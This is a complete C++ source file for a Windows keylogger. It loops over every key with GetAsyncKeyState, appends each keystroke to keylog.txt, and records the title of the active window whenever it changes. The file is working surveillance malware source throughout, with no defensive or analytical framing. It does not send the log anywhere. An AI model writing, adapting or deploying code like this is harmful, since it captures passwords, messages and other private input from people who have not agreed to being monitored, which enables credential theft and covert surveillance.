#include <iostream>
#include <fstream>
#include <windows.h>
#include <psapi.h>
#include <unordered_map>

#pragma comment(lib, "Psapi.lib")

std::ofstream logFile;
std::unordered_map<int, bool> keyState;  // Map to track key states (pressed or not)

// Function to get the current foreground window title
std::string getForegroundWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    char windowTitle[256];
    GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
    return std::string(windowTitle);
}

// Function to log key press events
void logKeyPress(int key) {
    if (key == VK_BACK) logFile << "[Backspace]";
    else if (key == VK_TAB) logFile << "[Tab]";
    else if (key == VK_RETURN) logFile << "[Enter]";
    else if (key == VK_ESCAPE) logFile << "[Esc]";
    else if (key >= '0' && key <= '9') logFile << "[" << (char)key << "]";
    else if (key >= 'A' && key <= 'Z') logFile << "[" << (char)key << "]";
    else if (key == VK_SPACE) logFile << " ";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) logFile << "[shift]";
    else if (key == VK_CAPITAL)  logFile << "[CAPSLOCK]";
    else if (key == VK_LEFT) logFile << "[Left Arrow]";
    else if (key == VK_RIGHT) logFile << "[Right Arrow]";
    else if (key == VK_UP) logFile << "[Up Arrow]";
    else if (key == VK_DOWN) logFile << "[Down Arrow]";
    else if (key == VK_DELETE) logFile << "[Delete]";
    else logFile << "[Unknown:" << key << "]";
    logFile.flush();  // Ensure the log is saved instantly
}

// Main function to capture keystrokes
int main() {
    // Open log file in append mode
    logFile.open("keylog.txt", std::ios_base::app);
    if (!logFile.is_open()) {
        std::cerr << "Unable to open keylog.txt for writing!\n";
        return 1;
    }

    std::cout << "Keylogger started...\n";

    // Log the current application
    std::string currentApp = getForegroundWindowTitle();
    logFile << "<" << currentApp << " opened>\n";
    logFile.flush();

    // Main loop for capturing keystrokes and monitoring applications
    while (true) {
        Sleep(5);  // Reduce the delay for faster execution

        // Check if the foreground window has changed
        std::string newApp = getForegroundWindowTitle();
        if (newApp != currentApp) {
            logFile << "<" << currentApp << " closed>\n";
            logFile << "<" << newApp << " opened>\n";
            logFile.flush();
            currentApp = newApp;
        }

        // Capture keystrokes
        for (int key = 0x08; key <= 0xFE; key++) {
            SHORT keyStateResult = GetAsyncKeyState(key);

            // Check if key is pressed and was not already logged
            if (keyStateResult & 0x8000 && !keyState[key]) {
                logKeyPress(key);
                keyState[key] = true;  // Mark the key as pressed
            }
            // Check if key is released
            else if (!(keyStateResult & 0x8000) && keyState[key]) {
                keyState[key] = false;  // Reset the key state
            }
        }
    }

    logFile.close();
    return 0;
}
